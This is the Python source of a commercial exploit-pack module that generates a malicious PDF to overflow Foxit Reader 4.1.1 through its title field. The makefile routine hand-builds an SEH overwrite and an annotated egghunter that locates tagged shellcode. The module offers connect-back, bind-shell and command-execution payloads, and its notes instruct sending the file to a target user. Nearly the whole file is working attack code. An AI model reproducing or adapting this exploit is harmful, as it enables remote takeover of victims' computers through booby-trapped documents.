
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside


######################################################################################
NAME = "Foxit Reader v4.1.1 Crafted PDF File Title Handling Overflow"
DESCRIPTION = "A clientside overflow in Foxit Reader v4.1.1"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Foxit'
DOCUMENTATION["Date public"] = "2010-11-13"
DOCUMENTATION["References"] = "http://osvdb.org/show/osvdb/68648"
DOCUMENTATION["Repeatability"] = "Unlimited"                              
DOCUMENTATION['CVE'] = "N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION['CVSS'] = '4.4'
DOCUMENTATION["Notes"] = """
This is a client-side exploit - run the module and send the created file to the target user.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "7", "Vista"]

NOTES="""
This is a client-side exploit - so run the module and send the created file
to the target user

WP> White Phosphorus Exploit Pack
WP> Foxit Reader Crafted PDF File Title Handling Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Windows Universal (Non-DEP)

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Bind MOSDEF Shell 
4: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_foxit_title/wp_foxit_title.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal (Non DEP)", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.encode_printable = True
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".pdf"
        return

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)    
        return
    

    def makefile(self):
                
        sc = 'c00kc00k'
        sc += self.shellcode
        
        filedata = wp_randomstring(540)
        
        filedata += "\x58\x6d" # pop eax, add [ebp] nseh
        filedata += "\x39\x64" # seh
        filedata += "\x43" # Alignmenent
        
        # Build our unicode searchcode
        filedata += "\x54\x6D\x58\x6D"  # Push ESP, Pop EAX
        
        filedata += "\xBB\x5f\x01\x6D"  # MOV EBX,1005f00 (For use in add [eax],bh calcs
        
        filedata += "\xC6\x66\x6D\x40\x6D"  # XOR DX,DX
        filedata += "\xC6\x33\x6D\x40\x6D"  # 
        filedata += "\xC6\xD2\x6D\x40\x6D"  # 
        
        filedata += "\xC6\x42\x6D\x40\x6D"  # INC EDX
        filedata += "\xC6\x52\x6D\x40\x6D"  # PUSH EDX
        
        filedata += "\xC6\x6A\x6D\x40\x6D"  # PUSH 02
        filedata += "\xC6\xA3\x38\x6D\x40\x6D"  # 
        
        filedata += "\xC6\x58\x6D\x40\x6D"  # POP EAX
        
        filedata += "\xC6\xCD\x6D\x40\x6D"  # INT 2E
        filedata += "\xC6\x2E\x6D\x40\x6D"  # 
        
        filedata += "\xC6\x21\x38\x6D\x40\x6D"  # cmp al,5
        filedata += "\xC6\xF8\x6D\x40\x6D"      # 
        filedata += "\xC6\xA6\x38\x6D\x40\x6D"  # 
        
        filedata += "\xC6\x5A\x6D\x40\x6D"      # POP EDX
        
        filedata += "\xC6\x75\x6D\x40\x6D"      # JNZ
        filedata += "\xC6\xA8\x38\x6D\x40\x6D"  # 
        
        filedata += "\xC6\x66\x6D\x40\x6D"      # OR DX,FFF
        filedata += "\xC6\x22\x38\x6D\x40\x6D"  # 
        filedata += "\xC6\xCA\x6D\x40\x6D"      # 
        filedata += "\xC6\xFF\x6D\x40\x6D"      # 
        filedata += "\xC6\xB0\x38\x6D\x40\x6D"  #  
        
        filedata += "\xC6\xEB\x6D\x40\x6D"      # JMP
        filedata += "\xC6\xEC\x6D\x40\x6D"      # JMP
        
        filedata += "\xC6\xB8\x6D\x40\x6D"      # MOV EAX,6B303063
        filedata += "\xC6\x63\x6D\x40\x6D"      # 
        filedata += "\xC6\x30\x6D\x40\x6D"      # 
        filedata += "\xC6\x30\x6D\x40\x6D"      # 
        filedata += "\xC6\x6B\x6D\x40\x6D"      # 
        
        filedata += "\xC6\x2A\x38\x6D\x40\x6D"  #  MOV EDI,EDX
        filedata += "\xC6\xD7\x6D\x40\x6D"      # 
        
        filedata += "\xC6\xAF\x6D\x40\x6D"      # SCAS
        filedata += "\xC6\x75\x6D\x40\x6D"      # JNZ
        filedata += "\xC6\xE2\x6D\x40\x6D"      # 
        filedata += "\xC6\xAF\x6D\x40\x6D"      # SCAS
        filedata += "\xC6\x75\x6D\x40\x6D"      # JNZ
        filedata += "\xC6\xDF\x6D\x40\x6D"      # 
        
        filedata += "\xC6\x57\x6D\x40\x6D"      # PUSH EDI
        filedata += "\xC6\xFD\x38\x6D\x40\x6D"  # POP ESP (This is to setup the printable shellcode)
        filedata += "\xC6\xFF\x6D\x40\x6D"      # JMP ESP
        filedata += "\xC6\xE4\x6D\x40\x6D"      # 
        
        filedata += "\x54\x6D\xC3"          # Push ESP, RET
        
        filedata += wp_randomstring(5000)
        filedata += sc[:sc.find("\\")] + "\\" + sc[sc.find("\\"):]      # need to escape the \
        filedata += "\x29\x3E\x3E\x0A\x65\x6E\x64\x6F\x62\x6A"
        filedata += wp_randomstring(100)
        
        return filedata

    def run(self):
        filedata=self.makefile()
        
        pdf = open('3rdparty/White_Phosphorus/exploits/wp_foxit_title/title.pdf.template').read()
        pdf = pdf.replace('PAYLOAD', filedata)
        
        self.log("WP> Opening %s for output"%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(pdf)
        fd.close()
        self.log('WP> Wrote to %s'%(self.filename))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
